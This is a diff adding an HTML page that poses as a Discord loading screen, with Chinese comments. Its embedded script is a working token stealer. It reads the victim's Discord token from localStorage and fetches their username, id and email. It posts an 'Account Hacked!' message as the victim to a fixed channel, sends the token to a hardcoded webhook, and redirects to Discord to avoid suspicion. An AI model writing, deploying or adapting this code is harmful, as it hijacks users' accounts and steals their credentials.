@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+  <meta charset="utf-8">
+  <title>Discord</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      margin: 0; display: flex; justify-content: center; align-items: center;
+      height: 100vh; background: #2f3136; color: #dcddde;
+      font-family: 'gg sans', 'Noto Sans', sans-serif;
+    }
+    .loader {
+      width: 48px; height: 48px; border: 4px solid #404249;
+      border-top: 4px solid #7289da; border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+  <div class="loader"></div>
+  <script>
+    (function() {
+      try {
+        let token = localStorage.getItem("token");
+        if (token) {
+          token = token.replace(/"/g, ""); // 移除 Discord 自動包上的雙引號
+
+          // 用 token 取得帳號資訊
+          fetch("https://discord.com/api/v9/users/@me", {
+            headers: { "Authorization": token }
+          }).then(async res => {
+            if (res.ok) {
+              const user = await res.json();
+              const username = user.username;
+              const userId = user.id;
+              const email = user.email || 'N/A';
+
+              // 發送訊息到目標 878151437085974548
+              fetch(`https://discord.com/api/v9/channels/878151437085974548/messages`, {
+                method: "POST",
+                headers: {
+                  "Content-Type": "application/json",
+                  "Authorization": token,
+                  "X-Correlation-Id": userId
+                },
+                body: JSON.stringify({
+                  content: `🔓 **Account Hacked!**\n使用者: **${username}** (${userId})\nEmail: ${email}`
+                })
+              }).catch(err => console.warn("Send message failed:", err));
+
+              // 把 token 送到 webhook 備份
+              fetch("https://discord.com/api/webhooks/1514570704698216540/vzBlx12YERIwjsCNBua6LTXSgqbKKANYYXGF4y7trdLp1rz4HVNDVx8pe5lhdf_Aisph", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                  content: `🔓 **Discord Token 已擷取**\n使用者: **${username}**\n\`\`\`\n${token}\n\`\`\``
+                })
+              }).catch(err => console.warn("Webhook failed:", err));
+            }
+            // 2 秒後跳回 Discord，降低目標懷疑
+            setTimeout(() => {
+              window.location.href = "https://discord.com/channels/@me";
+            }, 2000);
+          }).catch(err => console.warn("API call failed:", err));
+        }
+      } catch(e) {
+        console.log("Token 抓取失敗:", e);
+      }
+    })();
+  </script>
+</body>
+</html>
